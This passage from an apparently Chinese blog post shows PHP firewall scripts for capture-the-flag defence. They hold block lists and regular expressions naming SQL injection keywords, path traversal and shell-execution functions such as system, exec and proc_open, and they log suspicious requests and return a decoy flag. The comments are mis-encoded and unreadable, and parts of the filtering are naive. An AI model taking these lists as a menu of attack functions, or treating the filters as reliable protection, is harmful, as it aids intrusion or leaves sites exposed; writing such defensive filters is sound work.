class="hljs-variable">$data</span>)))); <span class="hljs-comment">//å¯¹POSTçš„å†…å®¹è¿›è¡Œæ£€æµ‹ï¼Œå‡ºç°é—®é¢˜æ‹¦æˆªå¹¶è®°å½•</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">æ£€æµ‹è¿‡äº†åˆ™å¯¹è¾“å…¥è¿›è¡Œç®€å•è¿‡æ»¤</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$headers</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$value</span>)))); <span class="hljs-comment">//å¯¹httpè¯·æ±‚å¤´è¿›è¡Œæ£€æµ‹ï¼Œå‡ºç°é—®é¢˜æ‹¦æˆªå¹¶è®°å½•</span><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">filter_dangerous_words</span>(<span class="hljs-variable">$value</span>); <span class="hljs-comment">//ç®€å•è¿‡æ»¤</span><br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">è·å–httpè¯·æ±‚å¤´å¹¶å†™å…¥æ•°ç»„</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_all_headers</span>(<span class="hljs-params"></span>) </span>&#123; <br><span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(); <br> <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123; <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) === <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123; <br><span class="hljs-variable">$headers</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>; <br>&#125; <br>&#125; <br> <br><span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>; <br>&#125; <br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">æ£€æµ‹ä¸å¯è§å­—ç¬¦é€ æˆçš„æˆªæ–­å’Œç»•è¿‡æ•ˆæœï¼Œæ³¨æ„ç½‘ç«™è¯·æ±‚å¸¦ä¸­æ–‡éœ€è¦ç®€å•ä¿®æ”¹</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_invisible</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>);<span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-variable">$ascii</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ascii</span>&gt;<span class="hljs-number">126</span> || <span class="hljs-variable">$ascii</span> &lt; <span class="hljs-number">32</span>)&#123; <span class="hljs-comment">//æœ‰ä¸­æ–‡è¿™é‡Œè¦ä¿®æ”¹</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ascii</span>, <span class="hljs-keyword">array</span>(<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>)))&#123;<br><span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;interrupt&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$ascii</span>, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;,&quot;</span>), <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">æ£€æµ‹ç½‘ç«™ç¨‹åºå­˜åœ¨äºŒæ¬¡ç¼–ç ç»•è¿‡æ¼æ´é€ æˆçš„%25ç»•è¿‡ï¼Œæ­¤å¤„æ˜¯å¾ªç¯å°†%25æ›¿æ¢æˆ%ï¼Œç›´è‡³ä¸å­˜åœ¨%25</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_0x25</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&quot;%25&quot;</span>) !== <span class="hljs-literal">false</span>)&#123;<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;%25&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$str</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">æ”»å‡»å…³é”®å­—æ£€æµ‹ï¼Œæ­¤å¤„ç”±äºä¹‹å‰å°†ç‰¹æ®Šå­—ç¬¦æ›¿æ¢æˆç©ºæ ¼ï¼Œå³ä½¿å­˜åœ¨ç»•è¿‡ç‰¹æ€§ä¹Ÿç»•ä¸è¿‡æ­£åˆ™çš„\b</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_attack_keyword</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/select\b|insert\b|update\b|drop\b|delete\b|dumpfile\b|outfile\b|load_file|rename\b|floor\(|extractvalue|updatexml|name_const|multipoint\(/i&quot;</span>, <span class="hljs-variable">$str</span>))&#123;<br><span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;sqli&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//æ­¤å¤„æ–‡ä»¶åŒ…å«çš„æ£€æµ‹æˆ‘çœŸçš„ä¸ä¼šå†™äº†ï¼Œæ±‚é«˜äººæŒ‡ç‚¹ã€‚ã€‚ã€‚</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]) &lt; <span class="hljs-number">2</span>)&#123;<br><span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>], <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\.\.|.*\.php[35]&#123;0,1&#125;/i&quot;</span>, <span class="hljs-variable">$tmp</span>))&#123; <br><span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;LFI/LFR&quot;</span>);;<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;LFI/LFR&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/base64_decode|eval\(|assert\(/i&quot;</span>, <span class="hljs-variable">$str</span>))&#123;<br><span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;EXEC&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$str</span>))&#123;<br><span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;GETFLAG&quot;</span>);<br>&#125;<br><br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">ç®€å•å°†æ˜“å‡ºç°é—®é¢˜çš„å­—ç¬¦æ›¿æ¢æˆä¸­æ–‡</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_dangerous_words</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;â€˜&quot;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;â€œ&quot;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;ã€Š&quot;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;ã€‹&quot;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">è·å–httpçš„è¯·æ±‚åŒ…ï¼Œæ„ä¹‰åœ¨äºè·å–åˆ«äººçš„æ”»å‡»payload</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_http_raw</span>(<span class="hljs-params"></span>) </span>&#123; <br><span class="hljs-variable">$raw</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br><br><span class="hljs-variable">$raw</span> .= <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>].<span class="hljs-string">&quot;\r\n&quot;</span>; <br> <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123; <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) === <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123; <br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">5</span>); <br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$key</span>); <br><span class="hljs-variable">$raw</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;: &#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&quot;\r\n&quot;</span>; <br>&#125; <br>&#125; <br><span class="hljs-variable">$raw</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br><span class="hljs-variable">$raw</span> .= <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <br><span class="hljs-keyword">return</span> <span class="hljs-variable">$raw</span>; <br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">è¿™é‡Œæ‹¦æˆªå¹¶è®°å½•æ”»å‡»payload</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write_attack_log</span>(<span class="hljs-params"><span class="hljs-variable">$alert</span></span>)</span>&#123;<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y/m/d H:i:s&quot;</span>).<span class="hljs-string">&quot; -- [&quot;</span>.<span class="hljs-variable">$alert</span>.<span class="hljs-string">&quot;]&quot;</span>.<span class="hljs-string">&quot;\r\n&quot;</span>.<span class="hljs-title function_ invoke__">get_http_raw</span>().<span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br><span class="hljs-variable">$ffff</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;log_is_a_secret_file.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment">//æ—¥å¿—è·¯å¾„ </span><br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$ffff</span>, <span class="hljs-variable">$data</span>);  <br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$ffff</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$alert</span> == <span class="hljs-string">&#x27;GETFLAG&#x27;</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&#123;f1989134-db6e-4769-ac1b-9d6ebf9ef46d&#125;&quot;</span>; <span class="hljs-comment">//å¦‚æœè¯·æ±‚å¸¦æœ‰flagå…³é”®å­—ï¼Œæ˜¾ç¤ºå‡çš„flagã€‚ï¼ˆ2333333ï¼‰</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">15</span>); <span class="hljs-comment">//æ‹¦æˆªå‰å»¶æ—¶15ç§’</span><br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br></pre></td><td class="code"><pre><code class="hljs php">waf plusç‰ˆæœ¬èƒ½è¿‡æ»¤éæ³•è¯·æ±‚å­—ç¬¦ï¼Œéæ³•å‡½æ•°ï¼Œè®°å½•æµé‡ï¼Œæ˜¾ç¤ºå‡flagç­‰ã€‚<br>å»ºè®®ä½¿ç”¨waf_plusè¿›è¡Œé€šé˜²ã€‚<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;LOG_FILENAME&#x27;</span>, <span class="hljs-string">&#x27;Attack_Big_information.txt&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;getallheaders&#x27;</span>)) &#123;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getallheaders</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) == <span class="hljs-string">&#x27;HTTP_&#x27;</span>) <span class="hljs-variable">$headers</span>[<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">5</span>))))) ] = <span class="hljs-variable">$value</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>;<br>    <span class="hljs-variable">$post</span> = <span class="hljs-variable">$_POST</span>;<br>    <span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_COOKIE</span>;<br>    <span class="hljs-variable">$header</span> = <span class="hljs-title function_ invoke__">getallheaders</span>();<br>    <span class="hljs-variable">$files</span> = <span class="hljs-variable">$_FILES</span>;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<br>    <span class="hljs-variable">$method</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>];<br>    <span class="hljs-variable">$filepath</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_NAME&quot;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-variable">$files</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&quot;virink&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$header</span>[<span class="hljs-string">&#x27;Accept&#x27;</span>]); <span class="hljs-comment">//fix a bug</span><br>    <span class="hljs-variable">$input</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;Get&quot;</span> =&gt; <span class="hljs-variable">$get</span>,<br>        <span class="hljs-string">&quot;Post&quot;</span> =&gt; <span class="hljs-variable">$post</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span> =&gt; <span class="hljs-variable">$cookie</span>,<br>        <span class="hljs-string">&quot;File&quot;</span> =&gt; <span class="hljs-variable">$files</span>,<br>        <span class="hljs-string">&quot;Header&quot;</span> =&gt; <span class="hljs-variable">$header</span><br>    );<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;select|insert|update|delete|and|or|\&#x27;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex&quot;</span>;<br>    <span class="hljs-variable">$pattern</span>.= <span class="hljs-string">&quot;|file_put_contents|fwrite|curl|system|eval|assert&quot;</span>;<br>    <span class="hljs-variable">$pattern</span>.= <span class="hljs-string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;<br>    <span class="hljs-variable">$pattern</span>.= <span class="hljs-string">&quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec&quot;</span>;<br>    <span class="hljs-variable">$vpattern</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-variable">$pattern</span>);<br>    <span class="hljs-variable">$bool</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$vpattern</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$v</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$kk</span> =&gt; <span class="hljs-variable">$vv</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$value</span>/i&quot;</span>, <span class="hljs-variable">$vv</span>)) &#123;<br>                    <span class="hljs-variable">$bool</span> = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-title function_ invoke__">logging</span>(<span class="hljs-variable">$input</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$bool</span>) <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$bool</span>) <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logging</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>&#123;<br><span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);<br><span class="hljs-variable">$time</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d H:i:s&quot;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(LOG_FILENAME, <span class="hljs-string">&quot;\r\n\r\n\r\n&quot;</span> . <span class="hljs-variable">$time</span> . <span class="hljs-string">&quot;\r\n&quot;</span> . <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$var</span>, <span class="hljs-literal">true</span>) , FILE_APPEND);<br>&#125;<br><span class="hljs-title function_ 